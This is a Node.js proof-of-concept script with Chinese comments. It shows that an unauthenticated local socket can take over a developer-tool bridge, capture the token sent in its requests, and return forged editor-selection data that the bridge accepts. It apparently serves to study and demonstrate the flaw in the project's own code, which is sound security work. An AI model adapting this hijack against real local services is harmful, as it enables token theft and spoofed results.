/**
 * 验证怀疑 2：一个没有 token 的连接，能不能"抢走"编辑器的位置并伪造回复？
 *
 * 关键点：
 *   - server.js 里 links.add(link) 发生在「连接建立」时，跟 token 对不对无关
 *   - _activeLink() 取的是「最后连上的那个」
 *   - protocol.js 里 msg 是 response（有 id 无 method）时，走的是「先查 pending」，
 *     根本不过 authorize 那道门
 *
 * 跑法：cd projects/dsh-vscode-dev && node work/scripts/lesson3-hijack.mjs
 */

import { mkdtempSync, rmSync, readdirSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'
import { createConnection } from 'node:net'

const here = dirname(fileURLToPath(import.meta.url))
const kitSrc = join(here, '..', '..', 'packages', 'dsh-vscode-kit', 'src')
const { apply } = await import('file://' + join(kitSrc, 'index.js').replace(/\\/g, '/'))
const { discoveryDir } = await import('file://' + join(kitSrc, 'discovery.js').replace(/\\/g, '/'))
const { connect, createLineSplitter } = await import('file://' + join(kitSrc, 'protocol.js').replace(/\\/g, '/'))

const home = mkdtempSync(join(tmpdir(), 'dsh-kit-hijack-'))
const dir = discoveryDir(home)

function fakeCtx() {
  const disposers = []
  return {
    provide() {},
    effect(fn) { const d = fn(); if (typeof d === 'function') disposers.push(d); return () => {} },
    async dispose() { for (const d of disposers.reverse()) { try { await d() } catch {} } },
  }
}
const ctx = fakeCtx()
const handle = apply(ctx, { dshHome: home, connectWaitMs: 0, onLog: () => {} })
await handle.boot
await new Promise((r) => setTimeout(r, 50))

const card = JSON.parse(readFileSync(
  join(dir, readdirSync(dir).find((f) => f.endsWith('.json'))), 'utf8'))

/** 一个「客户端」替身：连上、可选地报身份、记录收到的请求 */
function makePeer(name, { token } = {}) {
  return new Promise((resolve, reject) => {
    const s = createConnection({ port: card.port, host: '127.0.0.1' })
    s.once('error', reject)
    s.once('connect', () => {
      const link = connect({
        write: (line) => s.write(line),
        token,
        authorize: (t) => t === token,   // 与真正 connector.js 一致
      })
      const feed = createLineSplitter((line) => link.handleLine(line))
      s.on('data', (c) => feed(c))
      setTimeout(() => resolve({ name, socket: s, link }), 120)
    })
  })
}

console.log('=== 场景准备 ===')
console.log(`  桥：127.0.0.1:${card.port}   token：${card.token.slice(0, 16)}…`)

// 1. 真正的编辑器先连上（带 token，报身份，声明能力）
const editor = await makePeer('editor', { token: card.token })
await editor.link.request('bridge.hello', {
  client: 'real-vscode',
  capabilities: ['vscode.getSelection'],
})
console.log('  ① 真编辑器连上并报了身份')
console.log(`     kit.lastEditor = ${JSON.stringify(handle.kit.lastEditor?.client)}`)
console.log(`     在线连接数 = ${handle.kit.server.links.size}`)

// 2. 攻击者连上 —— 不带 token、不报身份、不跑 authorization 检查
//    真攻击者不会用我们的 protocol.js（那是老实人才用的东西），裸 socket 就够。
const attackerSocket = await new Promise((resolve, reject) => {
  const s = createConnection({ port: card.port, host: '127.0.0.1' })
  s.once('error', reject)
  s.once('connect', () => resolve(s))
})
console.log('')
console.log('=== 攻击者做了什么？只是连上了。没 token、不认识协议库，就裸 socket。 ===')
await new Promise((r) => setTimeout(r, 120))
console.log(`     在线连接数 = ${handle.kit.server.links.size}`)
console.log(`     kit.lastEditor 还是 ${JSON.stringify(handle.kit.lastEditor?.client)}（身份没被改）`)

// 攻击者：收请求 → 记下来（里面带 token！）→ 回一个假结果
const forged = []
const seenTokens = new Set()
let buf = ''
attackerSocket.on('data', (chunk) => {
  buf += chunk.toString('utf8')
  const lines = buf.split('\n')
  buf = lines.pop() ?? ''
  for (const line of lines) {
    if (!line.trim()) continue
    let m
    try { m = JSON.parse(line) } catch { continue }
    if (m.token) seenTokens.add(m.token)
    if (m.method && m.id !== undefined) {
      forged.push(m)
      // ★ 伪造回复：不带 token，直接回假数据。注意协议层根本不会看这行的 token。
      attackerSocket.write(JSON.stringify({
        jsonrpc: '2.0',
        id: m.id,
        result: { text: 'FAKE-SELECTION-FROM-ATTACKER', file: 'C:\\fake.txt', isEmpty: false },
      }) + '\n')
    }
  }
})

await new Promise((r) => setTimeout(r, 150))

console.log('')
console.log('=== 现在 DSH 侧发起一个正常请求：读编辑器选区 ===')
let result, error
try {
  result = await handle.kit.request('vscode.getSelection', {}, { waitForEditor: false, timeoutMs: 2000 })
} catch (e) {
  error = e
}

console.log(`  真编辑器收到请求了吗？ ${forged.length > 0 ? '否 —— 请求发给了别人' : '（未观测）'}`)
console.log(`  攻击者收到 DSH 的请求数量：${forged.length}`)
if (seenTokens.size > 0) {
  console.log(`  ★ 请求里附带 token，攻击者现在知道它是：${[...seenTokens][0].slice(0, 24)}…`)
}
if (forged.length > 0) {
  console.log(`  攻击者看到的请求：${JSON.stringify(forged[0]).slice(0, 160)}`)
}
console.log('')
if (result) {
  console.log('  ★★★ DSH 侧拿到的 result：')
  console.log('      ' + JSON.stringify(result))
  if (String(result.text).includes('FAKE')) {
    console.log('  ★★★ 这是攻击者伪造的数据 —— 冒充成功。响应不过鉴权门。')
  } else {
    console.log('  （这个结果来自真编辑器）')
  }
} else {
  console.log(`  请求失败：${error?.code} ${error?.message}`)
}
console.log('')
console.log('=== 结论 ===')
console.log('  authorize 只拦「请求」，不拦「响应」。')
console.log('  而 links 里谁最后连上谁就是 active。')
console.log('  → 任何本机进程只要连上端口、不报身份，就能截走并伪造 DSH 的调用结果。')

editor.socket.destroy()
attackerSocket.destroy()
await handle.stopped
await ctx.dispose()
rmSync(home, { recursive: true, force: true })
console.log('（临时目录已清理）')
